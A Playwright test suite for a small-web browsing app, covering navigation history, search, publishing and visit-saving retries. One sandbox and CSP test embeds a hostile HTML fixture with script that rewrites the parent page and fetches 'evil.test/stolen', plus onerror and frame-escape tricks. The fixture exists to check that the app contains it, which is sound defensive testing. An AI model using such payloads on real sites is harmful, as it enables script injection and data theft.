import { expect, test, type Page } from '@playwright/test';

const people = [
  { id: 'mira', name: 'Mira Chen', color: '#dce8d9' },
  { id: 'eli', name: 'Eli Brooks', color: '#ecdcc8' },
];
const addresses = ['tidepool.zz', 'moss.zz', 'observatory.zz', 'radio-room.zz'];
const titles = [
  'Notes from the tidepool',
  'A small green atlas',
  'The backyard observatory',
  'Signals from the spare room',
];
const sites = addresses.map((address, index) => ({
  address,
  title: titles[index],
  authorId: 'mira',
  publishedAt: '2026-09-01T09:00:00Z',
  html: `<h1>${titles[index]}</h1><p>Water and the quiet neighborhood.</p><details><summary>A note in the margin</summary><p>Remember this note.</p></details>${'<p>A long walk through the garden, watching the tide and listening to the birds.</p>'.repeat(24)}<a href="#" data-address="${addresses[(index + 1) % addresses.length]}">Keep wandering</a><p><a href="#" data-address="lost-lighthouse.zz">The lost lighthouse</a></p>`,
}));

interface RecordedVisit {
  id: string;
  personId: string;
  address: string;
  title: string;
  source: string;
  outcome: string;
  visitedAt: string;
}

async function mockWeb(page: Page) {
  const visits: RecordedVisit[] = [];
  const requests: string[] = [];
  const published = [...sites];
  await page.route('**/api/**', async (route) => {
    const request = route.request();
    const url = new URL(request.url());
    const path = url.pathname;
    requests.push(`${request.method()} ${path}${url.search}`);
    const respond = (body: unknown, status = 200) =>
      route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(body) });
    if (path === '/api/people') return respond(people);
    if (path === '/api/sites' && request.method() === 'GET') return respond(published);
    if (path === '/api/sites' && request.method() === 'POST') {
      const site = request.postDataJSON();
      if (published.some((existing) => existing.address === site.address))
        return respond({ message: 'That address already belongs to a site. Try another.' }, 409);
      const created = { ...site, publishedAt: new Date().toISOString() };
      published.push(created);
      return respond(created, 201);
    }
    if (path.startsWith('/api/sites/')) {
      const site = published.find(
        (site) => site.address === decodeURIComponent(path.split('/').at(-1)!),
      );
      return site ? respond(site) : respond({ message: 'Not found' }, 404);
    }
    if (path === '/api/search')
      return respond(
        published.map((site) => ({ ...site, excerpt: 'Water and the quiet neighborhood.' })),
      );
    if (path === '/api/visits') {
      const visit = request.postDataJSON();
      if (!visits.some((existing) => existing.id === visit.id))
        visits.push({ ...visit, visitedAt: new Date().toISOString() });
      return respond({ id: visit.id }, 201);
    }
    if (path.endsWith('/history')) {
      const personId = path.split('/')[3];
      return respond({
        items: visits
          .filter((visit) => visit.personId === personId)
          .slice()
          .reverse(),
        nextCursor: null,
      });
    }
    return respond({ message: 'Unexpected request' }, 500);
  });
  await page.goto('/');
  await expect(page.getByRole('heading', { name: 'A little room to wander.' })).toBeVisible();
  return { visits, requests, published };
}

async function goTo(page: Page, address: string) {
  await page.getByRole('textbox', { name: 'Site address', exact: true }).fill(address);
  await page.getByRole('button', { name: 'Go to address', exact: true }).click();
  await expect(page.getByRole('textbox', { name: 'Site address', exact: true })).toHaveValue(
    address,
  );
  const site = sites.find((site) => site.address === address);
  if (site)
    await expect(
      page.frameLocator('iframe').getByRole('heading', { name: site.title }),
    ).toBeVisible();
}

test('four-deep trail, back/forward, and forward branch replacement', async ({ page }) => {
  const { visits } = await mockWeb(page);
  await page.screenshot({ path: 'test-results/desktop-home.png', fullPage: true });
  await goTo(page, addresses[0]);
  for (let index = 1; index < addresses.length; index++) {
    await page.frameLocator('iframe').getByRole('link', { name: 'Keep wandering' }).click();
    await expect(
      page.frameLocator('iframe').getByRole('heading', { name: titles[index] }),
    ).toBeVisible();
  }
  await page.getByRole('button', { name: 'Back', exact: true }).click();
  await expect(page.frameLocator('iframe').getByRole('heading', { name: titles[2] })).toBeVisible();
  await page.getByRole('button', { name: 'Forward', exact: true }).click();
  await expect(page.frameLocator('iframe').getByRole('heading', { name: titles[3] })).toBeVisible();
  await page.getByRole('button', { name: 'Back', exact: true }).click();
  await goTo(page, 'moss.zz');
  await expect(page.getByRole('button', { name: 'Forward', exact: true })).toBeDisabled();
  await expect.poll(() => visits.length).toBe(8);
  expect(visits.map((visit) => visit.source)).toEqual([
    'typed',
    'link',
    'link',
    'link',
    'back',
    'forward',
    'back',
    'typed',
  ]);
});

test('restores the saved HTML, scroll position, and expanded details without refetching', async ({
  page,
}) => {
  const { requests, published } = await mockWeb(page);
  await goTo(page, 'tidepool.zz');
  await page.frameLocator('iframe').getByText('A note in the margin').click();
  await page.locator('iframe').evaluate((iframe: HTMLIFrameElement) => {
    iframe.contentDocument!.scrollingElement!.scrollTop = 450;
  });
  await goTo(page, 'moss.zz');
  published[0] = { ...published[0], html: '<h1>Changed on the server</h1>' };
  await page.getByRole('button', { name: 'Back', exact: true }).click();
  await expect(page.frameLocator('iframe').locator('h1')).toHaveText(titles[0]);
  await expect(page.frameLocator('iframe').locator('details')).toHaveAttribute('open', '');
  await expect
    .poll(() =>
      page
        .locator('iframe')
        .evaluate(
          (iframe: HTMLIFrameElement) => iframe.contentDocument!.scrollingElement!.scrollTop,
        ),
    )
    .toBe(450);
  expect(requests.filter((request) => request === 'GET /api/sites/tidepool.zz')).toHaveLength(1);
});

test('restores search results and their reading position', async ({ page }) => {
  const { requests } = await mockWeb(page);
  await page.getByRole('textbox', { name: 'Search the small web' }).fill('water');
  await page.getByRole('button', { name: 'Search', exact: true }).click();
  await expect(page.getByRole('heading', { name: 'Looking for “water”' })).toBeVisible();
  await page.locator('.page-viewport').evaluate((element) => {
    element.scrollTop = 100;
  });
  await page.getByRole('button', { name: /moss.zz A small green atlas/ }).click();
  await expect(page.frameLocator('iframe').locator('h1')).toHaveText(titles[1]);
  await page.getByRole('button', { name: 'Back', exact: true }).click();
  await expect(page.getByRole('heading', { name: 'Looking for “water”' })).toBeVisible();
  await expect(page.getByRole('textbox', { name: 'Search the small web' })).toHaveValue('water');
  expect(requests.filter((request) => request.startsWith('GET /api/search'))).toHaveLength(1);
  await expect(page.locator('.search-result')).toHaveCount(4);
  await expect
    .poll(() => page.locator('.page-viewport').evaluate((element) => element.scrollTop))
    .toBe(100);
});

test('broken links are visits and history is isolated per person and jumpable', async ({
  page,
}) => {
  const { visits } = await mockWeb(page);
  await goTo(page, 'tidepool.zz');
  await page.frameLocator('iframe').getByRole('link', { name: 'The lost lighthouse' }).click();
  await expect(page.getByRole('heading', { name: 'Nobody lives here. Yet.' })).toBeVisible();
  await expect.poll(() => visits.length).toBe(2);
  expect(visits[1]).toMatchObject({
    address: 'lost-lighthouse.zz',
    source: 'link',
    outcome: 'missing',
    personId: 'mira',
  });
  await page.getByRole('button', { name: 'History', exact: true }).click();
  await expect(
    page.getByRole('complementary', { name: 'Browsing history' }).getByText('lost-lighthouse.zz'),
  ).toBeVisible();
  await page.getByRole('combobox', { name: 'Browsing as' }).selectOption('eli');
  await page.getByRole('button', { name: 'History', exact: true }).click();
  await expect(page.getByText('A fresh start. Your visits will appear here.')).toBeVisible();
  await goTo(page, 'moss.zz');
  await expect.poll(() => visits.filter((visit) => visit.personId === 'eli').length).toBe(1);
  await page.getByRole('combobox', { name: 'Browsing as' }).selectOption('mira');
  await expect(page.getByRole('heading', { name: 'Nobody lives here. Yet.' })).toBeVisible();
  await page.getByRole('button', { name: 'History', exact: true }).click();
  await page
    .getByRole('complementary')
    .getByRole('button', { name: /Notes from the tidepool/ })
    .click();
  await expect(page.frameLocator('iframe').locator('h1')).toHaveText(titles[0]);
  await expect.poll(() => visits.at(-1)?.source).toBe('history');
});

test('failed requests do not alter the trail and superseded responses do not win', async ({
  page,
}) => {
  const { visits } = await mockWeb(page);
  await goTo(page, 'tidepool.zz');
  await page.route('**/api/sites/offline.zz', (route) =>
    route.fulfill({ status: 503, json: { message: 'Temporarily unavailable' } }),
  );
  await goTo(page, 'offline.zz');
  await expect(
    page.getByRole('alert').filter({ hasText: 'Temporarily unavailable' }),
  ).toBeVisible();
  await expect(page.frameLocator('iframe').locator('h1')).toHaveText(titles[0]);
  let release!: () => void;
  const delayed = new Promise<void>((resolve) => {
    release = resolve;
  });
  await page.route('**/api/sites/slow.zz', async (route) => {
    await delayed;
    await route.fulfill({ json: { ...sites[0], address: 'slow.zz' } }).catch(() => {});
  });
  await goTo(page, 'slow.zz');
  await goTo(page, 'moss.zz');
  release();
  await page.getByRole('button', { name: 'Back', exact: true }).click();
  await expect(page.frameLocator('iframe').locator('h1')).toHaveText(titles[0]);
  await expect.poll(() => visits.length).toBe(3);
  expect(visits.map((visit) => visit.address)).toEqual(['tidepool.zz', 'moss.zz', 'tidepool.zz']);
});

test('publishes as a chosen author and handles an occupied address', async ({ page }) => {
  await mockWeb(page);
  await page.getByRole('button', { name: 'Publish a page', exact: true }).click();
  const dialog = page.getByRole('dialog');
  await dialog.getByLabel('Site address').fill('tidepool.zz');
  await dialog.getByLabel('Page title').fill('My little garden');
  await dialog.getByLabel('Published by').selectOption('eli');
  await dialog.getByLabel('Your HTML').fill('<h1>My little garden</h1><p>Welcome, neighbor.</p>');
  await dialog.getByRole('button', { name: 'Publish page', exact: true }).click();
  await expect(dialog.getByRole('alert')).toContainText('already belongs');
  await dialog.getByLabel('Site address').fill('my-garden.zz');
  await dialog.getByRole('button', { name: 'Publish page', exact: true }).click();
  await expect(dialog.getByRole('heading', { name: 'A new corner of the web.' })).toBeVisible();
  await dialog.getByRole('button', { name: 'Visit your page' }).click();
  await expect(page.frameLocator('iframe').locator('h1')).toHaveText('My little garden');
  await expect(page.getByText('A page by Eli Brooks')).toBeVisible();
});

test('sandbox and CSP contain scripts and network resources even before sanitization', async ({
  page,
}) => {
  await mockWeb(page);
  const outgoing: string[] = [];
  const blocked: string[] = [];
  await page.route('https://evil.test/**', async (route) => {
    outgoing.push(route.request().url());
    await route.abort();
  });
  page.on('requestfailed', (request) => {
    if (request.url().includes('evil.test')) blocked.push(request.failure()?.errorText ?? '');
  });
  await page.route('**/api/sites/hostile.zz', (route) =>
    route.fulfill({
      json: {
        ...sites[0],
        address: 'hostile.zz',
        html: '<h1>Contained page</h1><script>parent.document.body.innerHTML="ESCAPED";fetch("https://evil.test/stolen")</script><img src="https://evil.test/pixel" onerror="parent.alert(1)"><form action="https://evil.test"><input></form><a href="https://evil.test" target="_top">Escape</a>',
      },
    }),
  );
  await goTo(page, 'hostile.zz');
  await expect(page.frameLocator('iframe').locator('h1')).toHaveText('Contained page');
  await page.frameLocator('iframe').getByRole('link', { name: 'Escape' }).click();
  await expect(page.getByRole('button', { name: 'Publish a page' })).toBeVisible();
  await expect(page).toHaveURL('http://127.0.0.1:3000/');
  expect(outgoing).toEqual([]);
  expect(blocked).toHaveLength(1);
  expect(blocked[0]).toMatch(/csp/i);
  await expect(page.locator('iframe')).toHaveAttribute('sandbox', 'allow-same-origin');
});

test('mobile layout keeps navigation and publishing usable', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 });
  await mockWeb(page);
  await page.screenshot({ path: 'test-results/mobile-home.png', fullPage: true });
  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(390);
  await goTo(page, 'tidepool.zz');
  await page.getByRole('button', { name: 'Publish a page' }).click();
  await expect(page.getByRole('dialog')).toBeVisible();
  await page.getByRole('button', { name: 'Close publish dialog' }).click();
  await page.getByRole('button', { name: 'History', exact: true }).click();
  await expect(page.getByRole('heading', { name: 'History', exact: true })).toBeVisible();
});

test('failed visit saves survive person switching and retry with the same id', async ({ page }) => {
  const { visits } = await mockWeb(page);
  let attempt = 0;
  const ids: string[] = [];
  await page.route('**/api/visits', async (route) => {
    ids.push(route.request().postDataJSON().id);
    if (attempt++ === 0) await route.fulfill({ status: 503, json: { message: 'Unavailable' } });
    else await route.fallback();
  });
  await goTo(page, 'tidepool.zz');
  await expect(page.getByText('A visit could not be saved to history.')).toBeVisible();
  await page.getByRole('combobox', { name: 'Browsing as' }).selectOption('eli');
  await page.getByRole('combobox', { name: 'Browsing as' }).selectOption('mira');
  await page.getByRole('button', { name: 'Retry saving' }).click();
  await expect.poll(() => visits.length).toBe(1);
  expect(ids).toHaveLength(2);
  expect(ids[1]).toBe(ids[0]);
  await expect(page.getByText('A visit could not be saved to history.')).toHaveCount(0);
});
